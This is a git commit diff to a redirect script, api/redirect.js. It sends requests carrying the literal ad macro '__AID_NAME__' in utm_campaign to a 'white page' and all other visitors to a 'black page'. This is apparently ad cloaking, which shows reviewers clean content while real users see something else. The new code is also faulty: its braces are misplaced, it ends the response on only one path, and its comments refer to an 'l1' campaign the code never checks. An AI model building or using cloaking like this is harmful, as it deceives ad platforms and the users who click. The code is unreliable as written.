25d4f7a209667fbde9c39058c8df798c7d7e6c80
Ayden Xu <aydenxunc@gmail.com>
2025-01-04 18:14:12 -0500

    serrrus

--- api/redirect.js
+++ api/redirect.js
@@ -5,23 +5,15 @@
   
     // Parse the UTM parameters from the request URL
     const queryParams = new URLSearchParams(req.url.split('?')[1]);
-    const utmTerm = queryParams.get('utm_term');
+    const utmCampaign = queryParams.get('utm_campaign');
   
-    // Get the User-Agent from the request headers
-    const userAgent = req.headers['user-agent'] || '';
-    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
-  
-    // Redirection logic
-    if (utmTerm === '__AID_NAME__') {
-        // If utm_term matches __AID_NAME__ exactly
-        res.writeHead(302, { Location: whitePageURL });
-    } else if (isMobileDevice) {
-        // Mobile devices without matching parameters
-        res.writeHead(302, { Location: blackPageURL });
-    } else {
-        // Desktop devices without matching parameters
-        res.writeHead(302, { Location: whitePageURL });
-    }
-  
-    res.end();
-}
+   // Redirection logic
+   if (utmCampaign === '__AID_NAME__') {
+    // UTM campaign 'l1' takes priority for both desktop and mobile
+    res.writeHead(302, { Location: whitePageURL });
+  } else{
+    // Mobile devices without 'l1' campaign
+    res.writeHead(302, { Location: blackPageURL });
+
+  res.end();
+}}
